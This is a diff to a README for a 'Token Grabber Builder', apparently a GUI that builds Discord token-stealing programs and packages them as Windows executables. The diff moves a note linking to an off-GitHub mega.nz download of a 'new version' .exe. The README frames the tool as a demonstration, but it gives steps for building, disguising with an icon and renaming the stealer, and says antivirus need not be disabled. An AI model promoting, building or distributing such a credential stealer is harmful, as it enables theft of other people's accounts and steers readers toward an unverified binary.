@@ -1,5 +1,8 @@
 # Token Grabber Builder
 a GUI demonstrating how Discord token grabbers in .py can be created and converted to .exe format.
+# Note
+The new file just >25 mb so i can't upload it on github so here you can download new version here ( working )
+[file .exe new version](https://mega.nz/file/FhNXnTLT#GA50Nig0K28PHhOiiIPy0fnoDvPY3LRVersZTiyHqes)
 # IMPORTANT
 YOU HAVE TO DOWNLOAD ALL ( OLD VERSION WITH NEW VERSION ) AND DELETE THE TOKEN GRABBER BUILDER.EXE ( OLD VERSION ) THEN USE THE NEW VERSION SO THAT'S THE FILE CAN WORKING
 # About :
@@ -20,7 +23,5 @@ Then choose your icon file. It should be an .ico file
 After that, click build then you're done
 Once you're done building the file, the output should be in the /dist folder. You can rename it to whatever you want.
 Developer note : No need to turn off anti virus or fire wall.
-# Note
-The new file just >25 mb so i can't upload it on github so here you can download new version here ( working )
-[file .exe new version](https://mega.nz/file/FhNXnTLT#GA50Nig0K28PHhOiiIPy0fnoDvPY3LRVersZTiyHqes)
+
 
